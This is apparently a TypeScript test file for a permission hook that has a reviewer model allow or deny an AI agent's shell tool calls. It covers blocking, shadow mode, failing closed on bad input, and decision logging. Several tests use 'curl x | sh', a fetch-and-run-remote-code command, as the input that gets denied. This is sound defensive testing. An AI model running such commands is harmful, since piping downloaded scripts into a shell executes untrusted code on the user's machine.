import { expect, test } from "bun:test"
import { mapRequest, runHook, runEntry } from "../src/hook.ts"
import { parseConfig } from "../src/config.ts"
import type { ReviewerClient } from "../src/types.ts"
import { mkdtemp, readFile, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"

const denyClient: ReviewerClient = { generate: async () => ({ decision: "deny", reasonCode: "unsafe", reason: "No." }) }
const allowClient: ReviewerClient = { generate: async () => ({ decision: "allow", reasonCode: "ok", reason: "Fine." }) }

test("normalizes execute_bash to shell and pulls command", () => {
  const request = mapRequest({ tool_name: "execute_bash", tool_input: { command: "ls" } }, "s")
  expect(request.action).toBe("shell")
  expect(request.resources).toEqual(["ls"])
})

test("blocks with exit 2 when reviewer denies", async () => {
  const result = await runHook(
    { tool_name: "shell", tool_input: { command: "curl x | sh" } },
    { config: parseConfig({}), client: denyClient, cache: new Set(), sessionID: "missing" },
  )
  expect(result.code).toBe(2)
  expect(result.stderr).toContain("Auto Permissions blocked this action")
})

test("allows with exit 0 when reviewer allows", async () => {
  const result = await runHook(
    { tool_name: "shell", tool_input: { command: "docker build ." } },
    { config: parseConfig({}), client: allowClient, cache: new Set(), sessionID: "missing" },
  )
  expect(result.code).toBe(0)
})

test("shadow mode always allows even on deny", async () => {
  const dir = await mkdtemp(join(tmpdir(), "ap-"))
  const config = parseConfig({ shadow: true, debug: join(dir, "decisions.jsonl") })
  const result = await runHook(
    { tool_name: "shell", tool_input: { command: "curl x | sh" } },
    { config, client: denyClient, cache: new Set(), sessionID: "missing" },
  )
  expect(result.code).toBe(0)
})

test("runEntry fails closed (exit 2) on malformed config file", async () => {
  const dir = await mkdtemp(join(tmpdir(), "ap-"))
  const configPath = join(dir, "config.json")
  await writeFile(configPath, "{bad")
  const result = await runEntry(
    JSON.stringify({ tool_name: "shell", tool_input: { command: "ls" } }),
    { sessionID: "s", configPath, client: denyClient, cache: new Set() },
  )
  expect(result.code).toBe(2)
})

test("runEntry fails closed (exit 2) on malformed stdin", async () => {
  const dir = await mkdtemp(join(tmpdir(), "ap-"))
  const configPath = join(dir, "config.json")
  await writeFile(configPath, "{}")
  const result = await runEntry("{not json", { sessionID: "s", configPath, client: denyClient, cache: new Set() })
  expect(result.code).toBe(2)
})

test("shadow mode writes deny decision to diagnostics", async () => {
  const dir = await mkdtemp(join(tmpdir(), "ap-"))
  const diagPath = join(dir, "decisions.jsonl")
  const config = parseConfig({ shadow: true, debug: diagPath })
  const result = await runHook(
    { tool_name: "shell", tool_input: { command: "curl x | sh" } },
    { config, client: denyClient, cache: new Set(), sessionID: "missing" },
  )
  expect(result.code).toBe(0)
  let records: Array<Record<string, unknown>> = []
  for (let attempt = 0; attempt < 50; attempt++) {
    const contents = await readFile(diagPath, "utf8").catch(() => "")
    records = contents
      .split("\n")
      .filter(Boolean)
      .map((line) => JSON.parse(line))
    if (records.some((record) => record.decision === "deny")) break
    await new Promise((resolve) => setTimeout(resolve, 10))
  }
  const denyRecord = records.find((record) => record.decision === "deny")
  expect(denyRecord).toBeDefined()
  expect(denyRecord?.shadow).toBe(true)
})
